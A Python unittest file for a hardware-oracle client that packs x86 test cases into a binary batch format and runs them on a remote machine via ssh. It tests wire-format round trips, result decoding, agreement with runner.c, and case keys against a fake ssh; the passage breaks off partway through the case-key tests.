#!/usr/bin/env python3
"""Tests for tools/hworacle/client.py, with no other machine: standard library only.

    cd <checkout> && .venv/bin/python tools/hworacle/tests/test_client.py

Exit status 0 when everything is right.  The ssh program is replaced by tests/fake_ssh.py (see its
docstring: it keeps its state in the directory named by $FAKE_SSH_STATE, logs every call, and can be
told to fail in many ways).  Every test uses a fresh state directory and a fresh cache root made by
tempfile.mkdtemp(); the real cache directory (inventory/hworacle_cache/) is never read or written,
and the real ssh binary is never run: client.SSH points at a generated wrapper around the fake, and
before client is imported HWORACLE_SSH names a path that does not exist.

  A  WireFormatTests     pack_batch / unpack_batch
  B  ResultTests         encode_result / decode_result / initial_mem / final_mem
  C  RunnerAgreement     client.py against runner.c: constants, enums, struct layouts
  D  CaseKeyTests        Case.key()
  E  OracleWithFakeSsh   Oracle.run and friends against the fake, incl. the remote-rules guard
     FakeSshSelfTests    the fake itself
     Findings            tests that FAIL because of a bug in client.py (each says which)
"""

import sys

sys.dont_write_bytecode = True

import contextlib  # noqa: E402
import copy  # noqa: E402
import gc  # noqa: E402
import hashlib  # noqa: E402
import io  # noqa: E402
import json  # noqa: E402
import os  # noqa: E402
import random  # noqa: E402
import re  # noqa: E402
import shlex  # noqa: E402
import shutil  # noqa: E402
import struct  # noqa: E402
import subprocess  # noqa: E402
import tempfile  # noqa: E402
import unittest  # noqa: E402
from unittest import mock  # noqa: E402

HERE = os.path.dirname(os.path.abspath(__file__))
HWORACLE_DIR = os.path.dirname(HERE)
FAKE_SSH = os.path.join(HERE, "fake_ssh.py")
RUNNER_C = os.path.join(HWORACLE_DIR, "runner.c")

# Make starting the real ssh impossible, whatever a test forgets to set up.
os.environ["HWORACLE_SSH"] = "/nonexistent/hworacle-tests-must-never-run-the-real-ssh"
os.environ["HWORACLE_HOST"] = "fake@fake-host"
sys.path.insert(0, HWORACLE_DIR)

import client  # noqa: E402

cachemod = client._load_sibling("hworacle_cache", "cache.py")     # the module object Oracle uses (same CacheConflict)

R, W, X = client.PROT_R, client.PROT_W, client.PROT_X
M64 = client.M64
D = client.REMOTE_DIR


# ================================================================================ helpers

def data_set(size=0x1000, code=b"\x90"):
    """A code region and a zero-filled writable data region."""
    return (client.code_region(code), client.Region(client.DATA_ADDR, None, R | W, size=size))


def cases_for(regions, n, start=0, **kw):
    return [client.Case(regions, client.CODE_ADDR, gpr=client.gpr_list(rax=start + i, rcx=0x77), tag=start + i, **kw)
            for i in range(n)]


def expected_answer(case, salt=b""):
    """What fake_ssh's CPU says about a case, computed here independently of the fake."""
    d = hashlib.sha256(case.record(0) + salt).digest()
    mem = []
    for r in case.regions:
        if r.prot & W:
            mem = [(r.addr, d[25:29])]
            break
    return int.from_bytes(d[:8], "little"), d[8:24], d[24] & 0xCD5, mem


def same_result(tc, a, b):
    for f in client.Result.__slots__:
        if f == "cached":
            continue
        tc.assertEqual(getattr(a, f), getattr(b, f), f)


def craft(index, outcome, detail=0, signo=0, sig_code=0, trapno=0, err=0, sig_addr=0, rip=0, rflags=0, mxcsr=0,
          insns=0, gpr=None, xmm=None, mem=()):
    """A result record built by hand (runs of memory in the order given, not sorted)."""
    gpr, xmm = gpr or {}, xmm or {}
    body = b"".join(struct.pack("<Q", gpr[i]) for i in sorted(gpr))
    body += b"".join(bytes(xmm[i]) for i in sorted(xmm))
    for a, d in mem:
        body += struct.pack("<QII", a, len(d), 0) + bytes(d) + bytes(-len(d) % 8)
    return client.RES_HDR.pack(client.RES_HDR.size - 4 + len(body), index, outcome, detail, signo, sig_code, trapno,
                               err, sig_addr, rip, rflags, mxcsr, insns, sum(1 << i for i in gpr),
                               sum(1 << i for i in xmm), len(mem)) + body


# ============================================================ A. wire format round trip

def make_region_sets(rng):
    code1 = client.Region(client.CODE_ADDR, rng.randbytes(200), R | X)
    code2 = client.Region(client.CODE_ADDR, rng.randbytes(5000), R | X)
    zero = client.Region(client.DATA_ADDR, None, R | W, size=0x4000)
    small = client.Region(client.DATA_ADDR + 0x10000, rng.randbytes(100), R | W, size=0x3000)       # blob < size
    at_max = client.Region(0x300000000000, rng.randbytes(client.INLINE_BLOB_MAX), R)                 # inline
    over = client.Region(0x310000000000, rng.randbytes(client.INLINE_BLOB_MAX + 1), R)               # stored
    big = client.Region(0x320000000000, rng.randbytes(200000), R | W)                               # stored
    empty = client.Region(0x330000000000, b"", R)                                                    # empty blob
    shared = client.Blob(rng.randbytes(300))
    sh1 = client.Region(0x340000000000, shared, R)
    sh2 = client.Region(0x350000000000, shared, R | W, size=0x2000)                                  # same blob twice
    sets = [(code1,), (code1, zero), (code2, small), (code1, zero, small), (at_max, code1), (over,), (big, zero),
            (over, big), (), (empty, code1), (sh1, sh2)]
    twin = (client.Region(client.CODE_ADDR, code1.blob.data, R | X),)       # equal content, different objects
    return sets + [twin]


def random_case(rng, regions):
    return client.Case(
        regions, rng.getrandbits(64), gpr=[rng.getrandbits(64) for _ in range(16)], rflags=rng.getrandbits(64),
        xmm=rng.randbytes(256), mxcsr=rng.getrandbits(32), gs_base=rng.getrandbits(64),
        max_insns=rng.choice([0, 1, 2, 7, rng.getrandbits(32)]),
        stops=[rng.getrandbits(64) for _ in range(rng.randint(0, 4))],
        pokes=[(rng.getrandbits(64), rng.randbytes(rng.randint(0, 40))) for _ in range(rng.randint(0, 3))],
        code_len=rng.choice([0, 0, rng.getrandbits(32)]), unchecked=rng.random() < 0.25, tag=rng.random())


def region_view(regions):
    return [(r.addr, r.size, r.prot, r.blob.sha if r.blob is not None else None) for r in regions]


class WireFormatTests(unittest.TestCase):
    def setUp(self):
        self.rng = random.Random(20261008)
        self.sets = make_region_sets(self.rng)
        n = 420
        self.cases = [random_case(self.rng, self.sets[i % len(self.sets)] if i < 2 * len(self.sets)
                                  else self.rng.choice(self.sets)) for i in range(n)]

    def test_round_trip_random_cases(self):
        data, stored = client.pack_batch(self.cases, time_limit_ms=1234, group_size=7, batch_limit_s=99)
        hdr, back = client.unpack_batch(data)
        self.assertEqual(len(back), len(self.cases))
        self.assertEqual((hdr["time_limit_ms"], hdr["group_size"], hdr["batch_limit_s"]), (1234, 7, 99))
        self.assertEqual((hdr["version"], hdr["flags"]), (client.FORMAT_VERSION, 0))
        for i, (a, b) in enumerate(zip(self.cases, back)):
            self.assertEqual(a.record(0), b.record(0), "case %d" % i)
            self.assertEqual(a.key(), b.key(), "case %d" % i)
            for f in ("rip", "gpr", "rflags", "xmm", "mxcsr", "gs_base", "max_insns", "stops", "pokes", "code_len",
                      "unchecked"):
                self.assertEqual(getattr(a, f), getattr(b, f), "case %d %s" % (i, f))
            self.assertEqual(region_view(a.regions), region_view(b.regions), "case %d" % i)

    def test_blobs_inline_or_stored(self):
        data, stored = client.pack_batch(self.cases)
        hdr, back = client.unpack_batch(data)
        used = {}
        for c in self.cases:
            for r in c.regions:
                if r.blob is not None:
                    used[r.blob.sha] = len(r.blob.data)
        want_stored = sorted(s for s, n in used.items() if n > client.INLINE_BLOB_MAX)
        self.assertEqual(len(want_stored), 2)
        self.assertEqual(sorted(b.sha for b in stored), want_stored)
        self.assertEqual(len(stored), len({b.sha for b in stored}), "a stored blob is listed twice")
        self.assertEqual(hdr["stored_blobs"], [b.sha for b in stored])
        for a, b in zip(self.cases, back):
            for ra, rb in zip(a.regions, b.regions):
                if ra.blob is None:
                    self.assertIsNone(rb.blob)
                elif len(ra.blob.data) > client.INLINE_BLOB_MAX:
                    self.assertEqual(rb.blob.data, b"")
                    self.assertEqual(rb.blob.sha, ra.blob.sha)
                else:
                    self.assertEqual(rb.blob.data, ra.blob.data)
        # the boundary: exactly INLINE_BLOB_MAX bytes is inline, one more is stored
        self.assertIn(client.INLINE_BLOB_MAX, used.values())
        self.assertIn(client.INLINE_BLOB_MAX + 1, used.values())

    def test_blobs_and_sets_are_shared(self):
        data, _ = client.pack_batch(self.cases)
        f = client.BATCH_HDR.unpack_from(data, 0)
        n_blobs, n_sets, n_cases = f[6], f[7], f[8]
        self.assertEqual(n_cases, len(self.cases))
        self.assertEqual(n_sets, len({client.regionset_key(c.regions) for c in self.cases}))
        self.assertEqual(n_sets, len(self.sets) - 1, "the twin set must be folded into its original")
        shas = {r.blob.sha for c in self.cases for r in c.regions if r.blob is not None}
        self.assertEqual(n_blobs, len(shas))

    def test_remote_blobs_off_sends_everything_inline(self):
        data, stored = client.pack_batch(self.cases, remote_blobs=False)
        self.assertEqual(stored, [])
        hdr, back = client.unpack_batch(data)
        self.assertEqual(hdr["stored_blobs"], [])
        for a, b in zip(self.cases, back):
            self.assertEqual(a.key(), b.key())
            for ra, rb in zip(a.regions, b.regions):
                if ra.blob is not None:
                    self.assertEqual(rb.blob.data, ra.blob.data)

    def test_alignment_the_runner_demands(self):
        data, _ = client.pack_batch(self.cases)
        self.assertEqual(len(data) % 8, 0)
        for c in self.cases:
            rec = c.record(0)
            self.assertEqual(len(rec) % 8, 0)
            self.assertEqual(struct.unpack_from("<I", rec, 0)[0], len(rec) - 4)
            self.assertEqual((len(rec) - 4) & 7, 4)

    def test_order_is_kept_and_packing_is_deterministic(self):
        a = client.pack_batch(self.cases)[0]
        self.assertEqual(a, client.pack_batch(self.cases)[0])
        shuffled = list(self.cases)
        random.Random(1).shuffle(shuffled)
        _, back = client.unpack_batch(client.pack_batch(shuffled)[0])
        self.assertEqual([c.key() for c in back], [c.key() for c in shuffled])

    def test_empty_batch(self):
        data, stored = client.pack_batch([])
        hdr, back = client.unpack_batch(data)
        self.assertEqual((back, stored, hdr["stored_blobs"]), ([], [], []))

    def small_batch(self):
        blob = bytes(range(10))
        regs = (client.Region(client.CODE_ADDR, blob, R | X), client.Region(client.DATA_ADDR, None, R | W, size=0x2000))
        cases = [client.Case(regs, 5, stops=[7, 8], pokes=[(client.DATA_ADDR, b"abc"), (client.DATA_ADDR + 9, b"")]),
                 client.Case(regs, 6, gpr=range(16), max_insns=0, code_len=3),
                 client.Case((), 9, unchecked=True)]
        return client.pack_batch(cases)[0], blob

    def test_damaged_batches_raise(self):
        wire, blob = self.small_batch()
        accepted = (ValueError, struct.error)
        # a flipped byte inside an inline blob (the hash no longer matches)
        off = wire.find(blob)
        self.assertGreater(off, 0)
        bad = wire[:off + 3] + bytes([wire[off + 3] ^ 0x40]) + wire[off + 4:]
        with self.assertRaises(ValueError):
            client.unpack_batch(bad)
        # a missing end marker, a wrong one, junk after it
        with self.assertRaises(accepted):
            client.unpack_batch(wire[:-8])
        with self.assertRaises(accepted):
            client.unpack_batch(wire[:-8] + struct.pack("<II", client.MAGIC_END_IN ^ 1, 0))
        with self.assertRaises(accepted):
            client.unpack_batch(wire + b"\0" * 8)
        # not a batch at all
        with self.assertRaises(ValueError):
            client.unpack_batch(b"\0" * 4 + wire[4:])
        # the case marker destroyed
        with self.assertRaises(accepted):
            m = wire.find(struct.pack("<I", client.MAGIC_CASES))
            client.unpack_batch(wire[:m] + b"\xff" + wire[m + 1:])

    def test_every_truncation_raises(self):
        wire, _ = self.small_batch()
        for cut in range(len(wire)):
            try:
                client.unpack_batch(wire[:cut])
            except (ValueError, struct.error):
                continue
            except Exception as e:                       # noqa: BLE001
                self.fail("a batch cut to %d of %d bytes raised %s instead of ValueError/struct.error" % (
                    cut, len(wire), type(e).__name__))
            self.fail("a batch cut to %d of %d bytes was accepted" % (cut, len(wire)))

    def test_a_truncated_last_case_raises(self):
        data, _ = client.pack_batch(self.cases[:5])
        last = len(self.cases[4].record(0))
        for cut in (1, 9, 100, last - 8 - 1, last - 8):
            with self.assertRaises((ValueError, struct.error), msg="cut %d bytes before the end" % (cut + 8)):
                client.unpack_batch(data[:len(data) - 8 - cut] + data[len(data) - 8:])

    def test_region_validation(self):
        for args in ((0x1001, b"", R), (0x1000, b"x" * 5000, R, 0x1000), (0x1000, b"", R, 0x1001), (0x1000, b"", 8)):
            with self.assertRaises(ValueError, msg=str(args[:1])):
                client.Region(*args)
        with self.assertRaises(ValueError):
            client.Case((), 0, gpr=[0] * 15)
        with self.assertRaises(ValueError):
            client.Case((), 0, xmm=bytes(255))


# ================================================================== B. results

class ResultTests(unittest.TestCase):
    def setUp(self):
        rng = random.Random(7)
        self.case = client.Case(
            (client.code_region(b"\x90"), client.Region(client.DATA_ADDR, None, R | W, size=0x2000)), 0x2000_0000_0000,
            gpr=[rng.getrandbits(64) for _ in range(16)], rflags=0x246, xmm=rng.randbytes(256), mxcsr=0x1F80)
        self.case.gpr[3] = M64                                  # an all-ones register that is not mentioned

    def variant(self, gpr_changes, xmm_changes):
        gpr = list(self.case.gpr)
        for i, v in gpr_changes.items():
            gpr[i] = v
        xmm = bytearray(self.case.xmm)
        for i, v in xmm_changes.items():
            xmm[16 * i:16 * i + 16] = v
        return gpr, bytes(xmm)

    def test_round_trip_every_outcome(self):
        c = self.case
        mem = [(client.DATA_ADDR + 0x40, b"\x01\x02\x03"), (client.DATA_ADDR, bytes(range(9))),
               (client.DATA_ADDR + 0x100, bytes(16))]
        table = [
            # outcome, detail, insns, state expected, extra fields
            (client.DONE, 0, 1, True, {}),
            (client.DONE, client.DONE_AT_STOP, 7, True, {}),
            (client.DONE, client.DONE_UNEXPECTED_RIP | client.DETAIL_MEM_TRUNCATED, 2, True, {}),
            (client.FAULT, 0, 0, True, dict(signo=11, sig_code=1, trapno=14, err=6, sig_addr=0xDEAD0000BEEF)),
            (client.REFUSED, 17, 0, False, {}),
            (client.REFUSED, 34, 3, True, {}),
            (client.TIMEOUT, 2000, 0, False, {}),
            (client.KILLED, 9, 0, False, {}),
            (client.BAD_CASE, 4, 0, False, {}),
            (client.RUNNER_ERROR, 0x101, 0, False, {}),
        ]
        for k, (outcome, detail, insns, state, extra) in enumerate(table):
            with self.subTest(outcome=outcome, detail=detail):
                gpr, xmm = self.variant({0: 0x1122334455667788, 5: 0, 15: M64, 3: 5},
                                        {0: bytes(range(16)), 3: bytes([0xEE] * 16), 15: bytes(16)})
                raw = client.encode_result(k, c, outcome, detail, gpr=gpr, xmm=xmm, rip=0x2000_0000_1234, rflags=0xFFF,
                                           mxcsr=0x1FA0, insns=insns, mem=mem, **extra)
                r = client.decode_result(raw, c)
                self.assertEqual((r.outcome, r.detail, r.insns), (outcome, detail, insns))
                for f, v in extra.items():
                    self.assertEqual(getattr(r, f), v, f)
                self.assertEqual(r.rip, 0x2000_0000_1234)
                self.assertEqual(r.has_state, state)
                self.assertEqual(r.gpr, [x & M64 for x in gpr])
                self.assertEqual(r.xmm, xmm)
                self.assertEqual(r.mem, sorted(mem))
                self.assertEqual(r.raw, raw)
                self.assertFalse(r.cached)
                self.assertIsNone(r.cpu)
                if state:
                    self.assertEqual((r.rflags, r.mxcsr), (0xFFF & client.RFLAGS_VISIBLE, 0x1FA0))
                else:           # a run that has no register state reports the case's flags and mxcsr
                    self.assertEqual((r.rflags, r.mxcsr), (c.rflags & client.RFLAGS_VISIBLE, c.mxcsr))
                self.assertIsInstance(r.describe(), str)

    def test_describe_and_properties(self):
        c = self.case

        def res(outcome, detail=0, **kw):
            return client.decode_result(client.encode_result(0, c, outcome, detail, **kw), c)
        self.assertIn("SIGSEGV", res(client.FAULT, signo=11, trapno=14).describe())
        self.assertIn("#PF", res(client.FAULT, signo=11, trapno=14).describe())
        self.assertIn(client.REASONS[17], res(client.REFUSED, 17).describe())
        self.assertIn("timeout after 2000 ms", res(client.TIMEOUT, 2000).describe())
        self.assertIn("SIGKILL", res(client.KILLED, 9).describe())
        self.assertIn(client.BAD_CASES[4], res(client.BAD_CASE, 4).describe())
        self.assertIn("done at rip", res(client.DONE, insns=1).describe())
        self.assertIn("(not where expected)", res(client.DONE, client.DONE_UNEXPECTED_RIP, insns=1).describe())
        self.assertIn("runner error", res(client.RUNNER_ERROR, 0x101).describe())
        self.assertTrue(res(client.DONE, client.DONE_AT_STOP, insns=1).at_stop)
        self.assertFalse(res(client.DONE, 0, insns=1).at_stop)
        self.assertTrue(res(client.DONE, client.DONE_UNEXPECTED_RIP, insns=1).unexpected_rip)
        self.assertTrue(res(client.DONE, client.DETAIL_MEM_TRUNCATED, insns=1).mem_truncated)
        self.assertFalse(res(client.REFUSED, 17).has_state)
        self.assertTrue(res(client.REFUSED, 17, insns=2).has_state)

    def test_registers_not_mentioned_come_from_the_case(self):
        c = self.case
        raw = craft(0, client.DONE, rip=1, rflags=0x41, mxcsr=0x1F81, insns=1,
                    gpr={2: 0xAAAA, 9: M64}, xmm={1: bytes([1] * 16), 14: bytes([14] * 16)},
                    mem=[(0x3000, b"abc"), (0x1000, b"0123456789"), (0x2000, bytes(16)), (0x1000, b"0")])
        r = client.decode_result(raw, c)
        want = [x & M64 for x in c.gpr]
        want[2], want[9] = 0xAAAA, M64
        self.assertEqual(r.gpr, want)
        xmm = bytearray(c.xmm)
        xmm[16:32], xmm[224:240] = bytes([1] * 16), bytes([14] * 16)
        self.assertEqual(r.xmm, bytes(xmm))
        self.assertEqual(r.mem, [(0x1000, b"0"), (0x1000, b"0123456789"), (0x2000, bytes(16)), (0x3000, b"abc")])
        self.assertEqual((r.rflags, r.mxcsr, r.rip), (0x41, 0x1F81, 1))
        # encode_result writes the same bytes for the same facts
        same = client.encode_result(0, c, client.DONE, 0, gpr=want, xmm=bytes(xmm), rip=1, rflags=0x41, mxcsr=0x1F81,
                                    insns=1, mem=sorted(r.mem))
        self.assertEqual(same, craft(0, client.DONE, rip=1, rflags=0x41, mxcsr=0x1F81, insns=1,
                                     gpr={2: 0xAAAA, 9: M64}, xmm={1: bytes([1] * 16), 14: bytes([14] * 16)},
                                     mem=sorted(r.mem)))

    def test_negative_registers_in_the_case_are_masked(self):
        c = client.Case((), 0, gpr=[-1] + [0] * 15)
        r = client.decode_result(client.encode_result(0, c, client.DONE, insns=1), c)
        self.assertEqual(r.gpr[0], M64)

    def test_trailing_junk_raises(self):
        c = self.case
        raw = client.encode_result(0, c, client.DONE, gpr=self.variant({1: 5}, {})[0], insns=1,
                                   mem=[(client.DATA_ADDR, b"abc")])
        client.decode_result(raw, c)
        for junk in (b"\0", b"x" * 8, bytes(16)):
            with self.assertRaises(client.OracleError, msg="%d junk bytes" % len(junk)):
                client.decode_result(raw + junk, c)
        with self.assertRaises(client.OracleError):                      # the last run's bytes cut short
            client.decode_result(raw[:-1], c)

    # ---- initial_mem / final_mem ----

    def test_initial_and_final_mem(self):
        A, B = 0x10000000, 0x20000000
        rng = random.Random(99)
        r1 = client.Region(A, rng.randbytes(0x1800), R | W, size=0x3000)          # data shorter than the region
        r2 = client.Region(B, None, R | W, size=0x2000)                            # zero-filled
        pokes = [(A - 0x10, b"AAAA" * 8), (A + 0x2FF8, b"B" * 32), (A + 0x100, b"C" * 5), (A + 0x102, b"DD"),
                 (B + 0x1FFF, b"EE"), (B + 3, b""), (A + 0x1000, rng.randbytes(40))]
        c = client.Case((r1, r2), A, pokes=pokes)

        def model(region):
            m = bytearray(region.blob.data if region.blob else b"").ljust(region.size, b"\0")
            for a, d in pokes:
                for k, byte in enumerate(d):
                    if region.addr <= a + k < region.addr + region.size:
                        m[a + k - region.addr] = byte
            return m
        models = {A: model(r1), B: model(r2)}
        for _ in range(400):
            reg = rng.choice((r1, r2))
            n = rng.choice((0, 1, 2, 7, 64, 0x400))
            off = rng.randrange(0, reg.size - n + 1)
            got = client.initial_mem(c, reg.addr + off, n)
            self.assertEqual(got, bytes(models[reg.addr][off:off + n]), "%#x+%d" % (reg.addr + off, n))
        # the range touches the end of a region exactly, or runs past it, or is nowhere
        self.assertEqual(client.initial_mem(c, A + 0x3000 - 4, 4), bytes(models[A][-4:]))
        self.assertIsNone(client.initial_mem(c, A + 0x3000 - 4, 5))
        self.assertIsNone(client.initial_mem(c, A - 1, 2))
        self.assertIsNone(client.initial_mem(c, 0x5000, 1))
        self.assertIsNone(client.initial_mem(c, B + 0x2000, 1))
        # final_mem: the result's runs on top of that, also when a run is only partly inside the range
        res = client.decode_result(client.encode_result(
            0, c, client.DONE, insns=1, mem=[(A + 0x104, b"XYZ"), (A + 0x1FFE, b"1234"), (B, b"\xff" * 8)]), c)
        for reg, off, n in ((r1, 0x100, 0x10), (r1, 0x1FF0, 0x10), (r1, 0x1FFF, 4), (r2, 0, 4), (r2, 4, 12),
                            (r1, 0x2000, 0x40)):
            want = bytearray(models[reg.addr][off:off + n])
            for a, d in res.mem:
                for k, byte in enumerate(d):
                    if reg.addr + off <= a + k < reg.addr + off + n:
                        want[a + k - reg.addr - off] = byte
            self.assertEqual(client.final_mem(c, res, reg.addr + off, n), bytes(want), "%#x+%d" % (reg.addr + off, n))
        self.assertIsNone(client.final_mem(c, res, 0x5000, 4))
        self.assertIsNone(client.final_mem(c, res, B + 0x1FFF, 2))


# =================================================== C. the client and runner.c agree

def c_comments_stripped(src):
    src = re.sub(r"/\*.*?\*/", "", src, flags=re.S)
    return re.sub(r"//[^\n]*", "", src)


def c_number(text):
    return int(re.sub(r"(?i)(u|ull|ul)$", "", text.strip()), 0)


class RunnerAgreement(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        with open(RUNNER_C) as f:
            cls.src = f.read()
        cls.nocomment = c_comments_stripped(cls.src)

    def test_refusal_reasons(self):
        found = {m.group(1): int(m.group(2))
                 for m in re.finditer(r"^\s*HWO_R_(\w+)\s*=\s*(\d+)\s*,", self.src, re.M)}
        self.assertGreaterEqual(len(found), 19)
        self.assertEqual(sorted(found.values()), sorted(client.REASONS), "HWO_R_* in runner.c vs client.REASONS")
        keywords = {"UNLISTED": "allow-list", "SYSCALL": "system call", "INT": "interrupt", "HLT": "hlt",
                    "IO": "i/o", "PRIV": "privileged", "NONDET": "machine-dependent", "SEG": "segment",
                    "X87MMX": "x87", "VEX": "vex", "FAR": "far", "INVALID64": "64-bit", "TRUNC": "end early",
                    "PREFIX": "prefix", "STATE": "state", "CTL_NO_STOP": "stop address", "NOT_EXEC": "executable",
                    "PROGRAM": "static check", "UNCHECKED": "unchecked"}
        for name, n in found.items():
            self.assertIn(name, keywords, "HWO_R_%s is new: add it to this test's table" % name)
            self.assertIn(keywords[name], client.REASONS[n].lower(), "HWO_R_%s = %d is described as %r" % (
                name, n, client.REASONS[n]))
        self.assertEqual(found["UNCHECKED"], 34, "client.cacheable() special-cases detail 34")

    def test_outcomes(self):
        m = re.search(r"enum\s*\{\s*(OUT_DONE[^}]*)\}", self.src)
        self.assertIsNotNone(m)
        items = re.findall(r"OUT_(\w+)\s*=\s*(\d+)", m.group(1))
        self.assertEqual([n for n, _ in items], ["DONE", "FAULT", "REFUSED", "TIMEOUT", "KILLED", "BAD_CASE",
                                                 "RUNNER_ERROR"])
        mine = {"DONE": client.DONE, "FAULT": client.FAULT, "REFUSED": client.REFUSED, "TIMEOUT": client.TIMEOUT,
                "KILLED": client.KILLED, "BAD_CASE": client.BAD_CASE, "RUNNER_ERROR": client.RUNNER_ERROR}
        for name, v in items:
            self.assertEqual(mine[name], int(v), "OUT_" + name)
        self.assertEqual(sorted(mine.values()), list(range(7)))
        self.assertEqual(sorted(k for k in client.OUTCOMES if k != client.NO_ANSWER), list(range(7)))
        self.assertLess(client.NO_ANSWER, 0)

    def test_bad_case_codes(self):
        m = re.search(r"enum\s*\{\s*(BAD_SET[^}]*)\}", self.src)
        names = [p.split("=")[0].strip() for p in m.group(1).split(",") if p.strip()]
        self.assertEqual(names, ["BAD_SET", "BAD_MXCSR", "BAD_GS", "BAD_POKE", "BAD_STOP", "BAD_RECORD",
                                 "BAD_SANDBOX", "BAD_LIMITS"])
        self.assertIn("BAD_SET = 1", m.group(1))
        self.assertEqual(sorted(client.BAD_CASES), list(range(1, len(names) + 1)))
        keywords = ["region set", "mxcsr", "gs", "poke", "stop", "malformed", "sandbox", "limits"]
        for i, kw in enumerate(keywords, 1):
            self.assertIn(kw, client.BAD_CASES[i].lower())

    def test_detail_flags_and_masks(self):
        def define(name):
            m = re.search(r"#define\s+%s\s+(0x[0-9A-Fa-f]+|\d+)(?:u|ull|ULL|U)?\b" % name, self.src)
            self.assertIsNotNone(m, name)
            return int(m.group(1), 0)
        self.assertEqual(define("DONE_AT_STOP"), client.DONE_AT_STOP)
        self.assertEqual(define("DONE_UNEXPECTED_RIP"), client.DONE_UNEXPECTED_RIP)
        self.assertEqual(define("DETAIL_MEM_TRUNCATED"), client.DETAIL_MEM_TRUNCATED)
        self.assertEqual(define("RFLAGS_VISIBLE"), client.RFLAGS_VISIBLE)
        self.assertEqual(define("CASE_UNCHECKED"), 1)

    def test_magic_numbers(self):
        got = {m.group(1): c_number(m.group(2))
               for m in re.finditer(r"#define\s+MAGIC_(\w+)\s+(0x[0-9A-Fa-f]+u?)", self.src)}
        self.assertEqual(got, {"BATCH": client.MAGIC_BATCH, "CASES": client.MAGIC_CASES, "END_IN": client.MAGIC_END_IN,
                               "RESULT": client.MAGIC_RESULT, "END_OUT": client.MAGIC_END_OUT})
        self.assertEqual(len({client.MAGIC_BATCH, client.MAGIC_CASES, client.MAGIC_END_IN, client.MAGIC_RESULT,
                              client.MAGIC_END_OUT}), 5)

    def test_versions(self):
        fv = int(re.search(r"#define HWO_FORMAT_VERSION (\d+)", self.src).group(1))
        ar = int(re.search(r"#define HWO_ANSWERS_REV (\d+)", self.src).group(1))
        self.assertEqual((fv, ar), (client.FORMAT_VERSION, client.ANSWERS_REV))

    def test_sizes_in_the_static_assert(self):
        m = re.search(r"_Static_assert\((.*?),\s*\"wire format sizes\"\s*\)", self.nocomment, re.S)
        self.assertIsNotNone(m)
        sizes = {n: int(v) for n, v in re.findall(r"sizeof\(struct (\w+)\)\s*==\s*(\d+)", m.group(1))}
        mine = {"batch_hdr": client.BATCH_HDR.size, "blob_hdr": client.BLOB_HDR.size,
                "region_rec": client.REGION_REC.size, "case_hdr": client.CASE_HDR.size,
                "poke_hdr": struct.calcsize("<QII"), "result_hdr": client.RESULT_HDR.size,
                "res_hdr": client.RES_HDR.size}
        self.assertEqual(sizes, mine)

    def c_fields(self, name):
        m = re.search(r"struct\s+%s\s*\{(.*?)\};" % name, self.nocomment, re.S)
        self.assertIsNotNone(m, name)
        out = []
        for decl in m.group(1).split(";"):
            decl = decl.strip()
            if not decl:
                continue
            mm = re.match(r"(u?int(?:8|16|32|64)_t|char)\s+(.*)$", decl, re.S)
            self.assertIsNotNone(mm, "cannot read %r in struct %s" % (decl, name))
            ctype = mm.group(1)
            for part in mm.group(2).split(","):
                pm = re.match(r"\s*(\w+)((?:\[\d+\])*)\s*$", part)
                self.assertIsNotNone(pm, part)
                count = 1
                for dim in re.findall(r"\[(\d+)\]", pm.group(2)):
                    count *= int(dim)
                if pm.group(2) and ctype in ("uint8_t", "char"):
                    out.append(("s", count))
                else:
                    code = {"uint8_t": "B", "uint16_t": "H", "int32_t": "i", "uint32_t": "I", "uint64_t": "Q",
                            "int64_t": "q", "char": "c"}[ctype]
                    out.extend([(code, 1)] * count)
        return out

    @staticmethod
    def py_fields(fmt):
        out = []
        for count, code in re.findall(r"(\d*)([A-Za-z])", fmt.lstrip("<>=!@")):
            if code == "s":
                out.append(("s", int(count or 1)))
            else:
                out.extend([(code, 1)] * int(count or 1))
        return out

    def test_struct_layouts_field_by_field(self):
        for cname, st in (("batch_hdr", client.BATCH_HDR), ("blob_hdr", client.BLOB_HDR),
                          ("region_rec", client.REGION_REC), ("case_hdr", client.CASE_HDR),
                          ("result_hdr", client.RESULT_HDR), ("res_hdr", client.RES_HDR)):
            self.assertEqual(self.c_fields(cname), self.py_fields(st.format), "struct %s vs %s" % (cname, st.format))
        self.assertEqual(self.c_fields("poke_hdr"), self.py_fields("<QII"))


# ====================================================================== D. Case.key()

def base_spec():
    return dict(
        regions=[(client.CODE_ADDR, bytes(range(200)), R | X, None), (client.DATA_ADDR, None, R | W, 0x2000),
                 (client.STACK_ADDR, bytes(range(50, 60)), R | W, 0x3000)],
        rip=client.CODE_ADDR + 3, gpr=[(i + 1) * 0x1111111111111111 & M64 for i in range(16)], rflags=0x246,
        xmm=bytes((i * 7 + 3) & 255 for i in range(256)), mxcsr=0x1F80, gs_base=0x1234000, max_insns=3,
        stops=[client.CODE_ADDR + 10, client.CODE_ADDR + 20],
        pokes=[(client.DATA_ADDR + 8, b"abcdef"), (client.DATA_ADDR + 100, b"\x01")], code_len=17, unchecked=False)


def build_case(spec, tag=None):
    regions = tuple(client.Region(a, d, p, s) for a, d, p, s in spec["regions"])
    return client.Case(regions, spec["rip"], gpr=spec["gpr"], rflags=spec["rflags"], xmm=spec["xmm"],
                       mxcsr=spec["mxcsr"], gs_base=spec["gs_base"], max_insns=spec["max_insns"],
                       stops=spec["stops"], pokes=spec["pokes"], code_len=spec["code_len"],
                       unchecked=spec["unchecked"], tag=tag)


def flip(data, i):
    b = bytearray(data)
    b[i] ^= 1
    return bytes(b)


class CaseKeyTests(unittest.TestCase):
    def variants(self):
        out = {}

        def add(name, fn):
            s = copy.deepcopy(base_spec())
            fn(s)
            out[name] = s
        for i in range(16):
            add("gpr%d" % i, lambda s, i=i: s["gpr"].__setitem__(i, s["gpr"][i] ^ 1))
        add("gpr0 top bit", lambda s: s["gpr"].__setitem__(0, s["gpr"][0] ^ (1 << 63)))
        add("rflags CF", lambda s: s.update(rflags=s["rflags"] ^ 1))
        add("rflags OF", lambda s: s.update(rflags=s["rflags"] ^ 0x800))
        for i in (0, 17, 255):
            add("xmm byte %d" % i, lambda s, i=i: s.update(xmm=flip(s["xmm"], i)))
        add("mxcsr", lambda s: s.update(mxcsr=0x1FA0))
        add("gs_base", lambda s: s.update(gs_base=s["gs_base"] + 8))
        add("rip", lambda s: s.update(rip=s["rip"] + 1))
        add("max_insns 0", lambda s: s.update(max_insns=0))
        add("max_insns 1", lambda s: s.update(max_insns=1))
        add("max_insns 4", lambda s: s.update(max_insns=4))
